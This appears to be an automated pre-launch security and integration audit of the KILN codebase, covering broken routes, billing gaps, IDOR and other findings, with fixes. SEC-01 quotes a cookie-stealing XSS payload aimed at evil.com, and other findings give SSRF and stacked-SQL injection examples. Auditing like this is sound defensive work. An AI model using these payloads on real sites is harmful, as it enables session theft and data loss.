# KILN Pre-Launch Audit Report

**Date:** 2026-03-22
**Auditor:** Claude (automated)
**Scope:** Full codebase — broken connections, cost risks, security vulnerabilities
**Status:** REPORT ONLY — no fixes applied

---

## Executive Summary

| Severity | Count | Categories |
|----------|-------|------------|
| CRITICAL | 4 | 1 XSS, 1 unauthenticated LLM endpoint, 2 missing node runtime entries |
| HIGH | 9 | 4 IDOR, 3 missing API routes, 1 unsubscribe without auth, 1 conditional cron auth |
| MEDIUM | 18 | Credit bypasses, rate limiting gaps, SSRF, CSRF, SQL concerns, env var gaps |
| LOW | 7 | In-memory rate limiter, error leakage, inconsistent URLs, misc |

**Total findings: 38**

---

## Part 1: Broken Connections & Integration Issues

### BC-01 — `mcp_tool` missing from NODE_CATEGORIES (CRITICAL)
- **File:** `src/lib/services/workflow-runtime.ts` (~line 154-202)
- **Issue:** The `mcp_tool` node type is defined in `workflow-node-types.ts` and has a config panel, but is **missing** from the `NODE_CATEGORIES` map. When executed, `getNodeCategory()` returns `"unknown"`, causing the node to be skipped or error.
- **Fix:** Add `mcp_tool: "integration"` to NODE_CATEGORIES.

### BC-02 — `mcp_tool` missing from integration-nodes dispatcher (CRITICAL)
- **File:** `src/lib/workflow-nodes/integration-nodes.ts` (lines 508-529)
- **Issue:** The `executeIntegrationNode` switch has **no case for `mcp_tool`**. Any workflow with this node throws `"Unbekannter Integration-Node-Typ: mcp_tool"`.
- **Fix:** Add `case "mcp_tool":` delegating to an `executeMCPTool()` function.

### BC-03 — `/api/agents/generate` route does not exist (HIGH)
- **File:** `src/components/onboarding-wizard.tsx` (line 66)
- **Issue:** Onboarding wizard calls `fetch("/api/agents/generate")` but the actual endpoint is `/api/ai/generate-agent`.
- **Fix:** Update fetch URL or create redirect route.

### BC-04 — `/api/analytics/overview` route does not exist (HIGH)
- **File:** `src/app/dashboard/page.tsx` (line 140)
- **Issue:** Main dashboard page fetches from this non-existent endpoint.
- **Fix:** Create the route handler or update the fetch URL.

### BC-05 — `/api/user/plan` route does not exist (HIGH)
- **File:** `src/app/dashboard/clients/page.tsx` (line 27)
- **Issue:** Clients page fetches from this non-existent endpoint. Should be `/api/stripe/plan`.
- **Fix:** Update fetch URL.

### BC-06 — `/api/health` route does not exist (MEDIUM)
- **File:** `src/app/offline/page.tsx` (line 16)
- **Issue:** Offline page pings `/api/health` to detect reconnection. Route doesn't exist.
- **Fix:** Create simple health check route.

### BC-07 — 10 PLAN_LIMITS keys missing from FeatureName type (MEDIUM)
- **Files:** `src/lib/feature-access.ts`, `src/lib/stripe.ts`
- **Issue:** These PLAN_LIMITS keys cannot be checked via `checkFeatureAccess()`:
  `marketplaceSelling`, `roiDashboard`, `roiPdfExport`, `mcpTeamRoles`, `knowledgeGraph`, `knowledgeGraphVisual`, `voiceInterface`, `agentCollaboration`, `publicAgentDirectory`, `dataWriteEnabled`
- **Fix:** Add to `FeatureName` union and `getUpgradeMessage()` labels.

### BC-08 — 13+ env vars used but not in .env.example (MEDIUM)
- **Issue:** Undocumented env vars: `TELEGRAM_BOT_TOKEN`, `WHATSAPP_PHONE_NUMBER_ID`, `WHATSAPP_ACCESS_TOKEN`, `VAPID_PRIVATE_KEY`, `NEXT_PUBLIC_VAPID_PUBLIC_KEY`, `VAPID_SUBJECT`, `GOOGLE_AI_API_KEY`, `ELEVENLABS_API_KEY`, `NEXT_PUBLIC_DEMO_AGENT_SLUG`, `VERCEL_DOMAIN`, `NEXT_PUBLIC_BASE_URL`, `STRIPE_CONNECT_WEBHOOK_SECRET`, `RESEND_FROM`, `GOOGLE_CLIENT_ID`/`GOOGLE_CLIENT_SECRET`
- **Fix:** Add all to `.env.example` with descriptions.

### BC-09 — Inconsistent `NEXT_PUBLIC_APP_URL` fallbacks (LOW)
- **Issue:** Fallback values differ across files: `kilnbase.com`, `kiln.hephaistos-systems.de`, `app.kiln.hephaistos-systems.de`, `kiln-topaz.vercel.app`, `localhost:3000`
- **Fix:** Standardize all fallbacks to one domain.

### BC-10 — Missing "advanced" WORKFLOW_CATEGORIES entry (LOW)
- **File:** `src/lib/workflow-node-types.ts` (lines 109-122)
- **Issue:** Node types use `category: "advanced"` but no category definition exists in the array.
- **Fix:** Add advanced category definition.

---

## Part 2: Cost Risks & Resource Abuse

### CR-01 — Unauthenticated LLM endpoint `/api/ai/generate-agent` (CRITICAL)
- **File:** `src/app/api/ai/generate-agent/route.ts` (lines 4-69)
- **Issue:** **Zero authentication** — no `auth()`, no API key, no credits, no rate limit. Anyone can make unlimited Claude Sonnet 4 calls (`max_tokens: 4096`).
- **Cost Impact:** Hundreds to thousands of dollars per hour under attack.
- **Fix:** Add Clerk `auth()`, rate limiting, and credit checks.

### CR-02 — Preview endpoint bypasses credit system (HIGH)
- **File:** `src/app/api/agents/[id]/preview/route.ts` (lines 35-234)
- **Issue:** Auth required but **no credit check or deduction**. Free-tier users with 0 credits can make unlimited LLM calls. Rate limiter only active if Upstash is configured.
- **Fix:** Add `checkCredits` before and `deductCredits` after LLM call.

### CR-03 — All webhook handlers skip credit pre-check (HIGH)
- **Files:** `src/app/api/webhooks/slack/[agentId]/route.ts`, `telegram/`, `whatsapp/`, `email/`, `github/`, `agent/[path]/`
- **Issue:** Credits deducted **after** LLM call (fire-and-forget), never checked **before**. Calls proceed at zero balance. Balance can go negative with no floor enforcement.
- **Fix:** Add `checkCredits` before every webhook LLM call.

### CR-04 — BYOK provider mismatch bypasses billing (MEDIUM)
- **File:** `src/lib/credits.ts` (lines 127-129)
- **Issue:** If a user has a BYOK key for provider A but uses provider B's model, the system uses KILN's key but treats it as BYOK (cost = 0).
- **Fix:** Validate BYOK key matches the actual model provider.

### CR-05 — Team generation endpoints have no credit check (MEDIUM)
- **Files:** `src/app/api/teams/suggest-structure/route.ts`, `src/app/api/teams/[id]/generate-members/route.ts`
- **Issue:** Uses Claude Sonnet 4 (`max_tokens: 4000`) with no credit check or deduction.
- **Fix:** Add credit check and deduction.

### CR-06 — Orchestration handoff triggers unbilled LLM calls (MEDIUM)
- **File:** `src/lib/services/chat-service.ts` (lines 108-274)
- **Issue:** A single message can trigger 3-4 LLM calls (evaluation + handoff + intent detection) but only 1 credit is deducted.
- **Fix:** Deduct credits for evaluation and handoff calls.

### CR-07 — Memory extraction LLM call unbilled (LOW)
- **File:** `src/lib/services/chat-service.ts` (lines 33-79)
- **Issue:** `extractAndSaveMemories` makes a Claude call (`max_tokens: 512`) after every chat, never billed.
- **Fix:** Include in credit deduction or use cheaper model.

### CR-08 — Workflow has no max node execution counter (MEDIUM)
- **File:** `src/lib/services/workflow-runtime.ts` (lines 465-1100)
- **Issue:** Time-based timeout (30 min default) but no max node count. A complex workflow can trigger hundreds of LLM calls within the window.
- **Fix:** Add `MAX_NODE_EXECUTIONS` counter (e.g., 200).

### CR-09 — Chat endpoint rate limiter is conditional (MEDIUM)
- **File:** `src/app/api/agents/[id]/chat/route.ts` (lines 38-47, 135-143)
- **Issue:** Rate limiter only active with Upstash env vars. Without them, the public chat endpoint (no auth required) has zero rate limiting.
- **Fix:** Fall back to in-memory rate limiting if Upstash unavailable.

### CR-10 — Telegram/WhatsApp/Slack webhooks have no rate limiting (MEDIUM)
- **Files:** `src/app/api/webhooks/telegram/`, `whatsapp/`, `slack/`
- **Issue:** Unlike email (50/day limit), these have zero rate limiting.
- **Fix:** Add per-agent-per-channel rate limiting.

### CR-11 — Credit balance can go negative (MEDIUM)
- **File:** `src/lib/credits.ts` (lines 158-166)
- **Issue:** `deductCredits` uses `decrement` without `WHERE balance >= cost`. The `Math.max(0, ...)` only affects the return value, not the DB.
- **Fix:** Use conditional update with floor check.

### CR-12 — Race condition in credit check vs deduction (MEDIUM)
- **File:** `src/lib/credits.ts` (lines 105-143, 148-199)
- **Issue:** `checkCredits` and `deductCredits` are separate, non-atomic. Concurrent requests can all pass the check and over-spend.
- **Fix:** Use atomic `UPDATE ... WHERE balance >= cost RETURNING *`.

### CR-13 — Automation cron skips credit pre-check (MEDIUM)
- **File:** `src/app/api/automations/run/route.ts`
- **Issue:** Runs LLM calls for all enabled automations, deducts after. No pre-check.
- **Fix:** Add `checkCredits` before each automation LLM call.

### CR-14 — V1 API chat deducts without pre-check (MEDIUM)
- **File:** `src/app/api/v1/agents/[id]/chat/route.ts`
- **Issue:** Public API has rate limiting and API key auth but only deducts credits after LLM call without pre-check.
- **Fix:** Add `checkCredits` before LLM call.

### CR-15 — Data pipeline has adequate protections (INFO)
- **Files:** `src/lib/data-pipeline/db-connector.ts`, `query-builder.ts`
- **Notes:** 30s query timeout, 10k row limit, auto LIMIT injection, dangerous SQL blocking. Well protected.

---

## Part 3: Security Vulnerabilities

### SEC-01 — XSS via embed script color injection (CRITICAL)
- **File:** `src/app/api/embed/[slug]/route.ts` (line 37)
- **Issue:** `primaryColor` from agent's `whiteLabel` JSON is interpolated directly into dynamically generated JavaScript without sanitization: `var color = '${color}';`
- **Exploitation:** Agent owner sets `whiteLabel.primaryColor` to `'; document.location='https://evil.com/steal?c='+document.cookie;//`. Executes on every third-party site loading the embed.
- **Fix:** Validate color with `isValidHexColor` regex before interpolation (the embed page does this, the script route doesn't).

### SEC-02 — IDOR on webhook update (HIGH)
- **File:** `src/app/api/agents/[id]/webhooks/route.ts` (lines 56-68)
- **Issue:** Updates webhook by `webhookId` alone without verifying it belongs to the authenticated user's agent.
- **Fix:** Add `where: { id: webhookId, agentId: params.id }`.

### SEC-03 — IDOR on webhook delete (HIGH)
- **File:** `src/app/api/agents/[id]/webhooks/route.ts` (line 115)
- **Issue:** Deletes webhook by `webhookId` without ownership verification.
- **Fix:** Add `where: { id: webhookId, agentId: params.id }`.

### SEC-04 — IDOR on custom tool update (HIGH)
- **File:** `src/app/api/agents/[id]/custom-tools/route.ts` (lines 63-77)
- **Issue:** Updates tool by `toolId` without verifying it belongs to the user's agent.
- **Fix:** Add `agentId: params.id` to where clause.

### SEC-05 — IDOR on custom tool delete (HIGH)
- **File:** `src/app/api/agents/[id]/custom-tools/route.ts` (line 120)
- **Issue:** Deletes by `toolId` without ownership check.
- **Fix:** Add agentId verification.

### SEC-06 — Unsubscribe endpoint allows unauthenticated account modification (HIGH)
- **File:** `src/app/api/unsubscribe/weekly-report/route.ts` (lines 5-14)
- **Issue:** Takes raw `userId` as query param with no auth or signed token. Anyone can disable weekly reports for any user. Also enables user ID enumeration.
- **Fix:** Use HMAC-signed tokens in unsubscribe links.

### SEC-07 — Cron endpoints fail-open without CRON_SECRET (HIGH)
- **Files:** `src/app/api/automations/run/route.ts` (lines 43-47), `src/app/api/cron/team-schedules/route.ts` (lines 223-225)
- **Issue:** Auth check is `if (cronSecret && ...)` — skipped entirely if `CRON_SECRET` is unset. Anyone can trigger all automations and team schedules.
- **Fix:** Fail-closed: reject all requests if `CRON_SECRET` is not set.

### SEC-08 — No rate limiting on internal API routes (MEDIUM)
- **Issue:** `checkRateLimit` only applied to v1 public API routes. All internal routes (`/api/agents/`, `/api/teams/`, `/api/integrations/`) have zero rate limiting.
- **Fix:** Add rate limiting middleware for expensive operations.

### SEC-09 — No CSRF protection on state-changing operations (MEDIUM)
- **Issue:** POST/PUT/DELETE operations rely solely on Clerk session cookies. No CSRF tokens or `SameSite=Strict` enforcement.
- **Fix:** Ensure `SameSite=Strict` cookies or implement CSRF tokens / custom header requirement.

### SEC-10 — Slack signature verification conditional (MEDIUM)
- **File:** `src/app/api/webhooks/slack/events/route.ts` (lines 54-61)
- **Issue:** Verification skipped if `SLACK_SIGNING_SECRET` not set. Forged payloads trigger LLM calls.
- **Fix:** Reject requests if signing secret not configured.

### SEC-11 — Notification webhook SSRF (MEDIUM)
- **File:** `src/app/api/automations/run/route.ts` (lines 200-217)
- **Issue:** `notificationTarget` URL fetched without SSRF validation. User can target `http://169.254.169.254/` for cloud metadata access.
- **Fix:** Apply `validateUrl()` from `src/lib/url-validation.ts`.

### SEC-12 — MySQL DESCRIBE injection via table name (MEDIUM)
- **File:** `src/lib/data-pipeline/db-connector.ts` (line 595)
- **Issue:** Table name interpolated into `DESCRIBE \`${tableName}\`` — backtick in table name could cause injection on user's connected DB.
- **Fix:** Validate table names against `[a-zA-Z0-9_]` pattern.

### SEC-13 — AI-generated SQL bypass risk (MEDIUM)
- **File:** `src/lib/data-pipeline/query-builder.ts` (lines 43-111)
- **Issue:** `DANGEROUS_STATEMENTS` regex doesn't block stacked queries (semicolons). LLM could output `SELECT ...; DROP TABLE ...`.
- **Fix:** Block semicolons in generated SQL. Use single-statement mode.

### SEC-14 — In-memory rate limiter resets on cold start (LOW)
- **File:** `src/lib/rate-limit.ts`
- **Issue:** Uses in-memory `Map`. On Vercel serverless, each cold start resets all limits.
- **Fix:** Use Redis/Upstash for distributed rate limiting.

### SEC-15 — Error messages leak internal details (LOW)
- **Issue:** Many routes pass `err.message` to response, potentially exposing Prisma errors, table names, connection strings.
- **Fix:** Log detailed errors server-side, return generic messages to clients.

### SEC-16 — WhatsApp signature verification conditional (LOW)
- **File:** `src/app/api/webhooks/whatsapp/[agentId]/route.ts` (lines 67-74)
- **Issue:** Verification only if `WHATSAPP_APP_SECRET` is set.
- **Fix:** Require secret or reject requests.

### SEC-17 — No hardcoded secrets found (INFO)
- All sensitive values properly reference environment variables. `.env.example` has placeholders only.

---

## Priority Fix Order (Recommended)

### Immediate (before launch)
1. **SEC-01** — XSS in embed script (CRITICAL) — one-line regex validation fix
2. **CR-01** — Unauthenticated `/api/ai/generate-agent` (CRITICAL) — add auth
3. **BC-01/BC-02** — `mcp_tool` missing from runtime (CRITICAL) — add switch case + category
4. **SEC-02 to SEC-05** — IDOR on webhooks/tools (HIGH) — add ownership checks
5. **SEC-07** — Cron fail-open (HIGH) — change to fail-closed
6. **CR-03** — Webhook credit pre-checks (HIGH) — add `checkCredits` to all handlers
7. **CR-02** — Preview credit bypass (HIGH) — add credit check

### Before scaling
8. **CR-11/CR-12** — Credit atomicity + race conditions (MEDIUM)
9. **SEC-08** — Internal API rate limiting (MEDIUM)
10. **SEC-11** — SSRF in notification webhooks (MEDIUM)
11. **SEC-13** — Block semicolons in AI-generated SQL (MEDIUM)
12. **CR-09** — Mandatory rate limiting fallback (MEDIUM)
13. **BC-03/BC-04/BC-05** — Fix broken API routes (HIGH)

### Nice to have
14. **BC-07** — Sync FeatureName with PLAN_LIMITS (MEDIUM)
15. **BC-08** — Document env vars (MEDIUM)
16. **SEC-15** — Sanitize error messages (LOW)
17. **BC-09** — Standardize URL fallbacks (LOW)
